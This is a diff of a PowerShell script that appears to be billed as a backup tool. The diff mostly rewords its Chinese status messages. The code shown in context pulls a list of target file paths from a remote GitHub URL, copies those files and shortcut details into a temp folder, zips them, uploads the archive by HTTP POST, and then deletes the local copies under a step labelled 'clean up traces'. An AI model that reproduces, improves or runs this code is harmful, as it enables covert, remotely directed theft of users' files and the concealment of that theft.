@@ -30,12 +30,12 @@ New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinu
 
 # STEP 1: Load file path list from remote .txt
 $remoteTxtUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/upload-target.txt"
-$pathList = @()
 try {
     $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
     $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
 } catch {
-    Write-Output "❌ 无法加载路径列表"
+    Write-Output "❌ 无法加载路径列表。"
+    $pathList = @()
 }
 
 $index = 0
@@ -57,7 +57,7 @@ foreach ($path in $pathList) {
             Copy-Item $path -Destination $dest -Force -ErrorAction Stop
         }
     } catch {
-        Write-Output "⚠️ 拷贝失败: $path"
+        Write-Output "⚠️ 拷贝失败：$path"
     }
 }
 
@@ -82,14 +82,14 @@ try {
     $lnkOutputFile = Join-Path $tempRoot "lnk_info.txt"
     $lnkReport | Out-File -FilePath $lnkOutputFile -Encoding utf8
 } catch {
-    Write-Output "⚠️ 快捷方式信息提取失败"
+    Write-Output "⚠️ 快捷方式提取失败"
 }
 
 # STEP 3: 压缩归档
 try {
     Compress-Archive -Path "$tempRoot\\*" -DestinationPath $zipPath -Force -ErrorAction Stop
 } catch {
-    Write-Output "❌ 压缩失败"
+    Write-Output "❌ 压缩失败，终止上传。"
     exit
 }
 
@@ -123,12 +123,12 @@ try {
         "Content-Type" = "application/zip"
         "User-Agent" = "PowerShellScript"
     }
-    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
+    $response = Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
 } catch {
-    Write-Output "❌ 上传失败"
+    Write-Output "❌ 上传文件失败"
 }
 
-# STEP 5: 清理
+# STEP 5: 清理痕迹
 try {
     Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
     Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
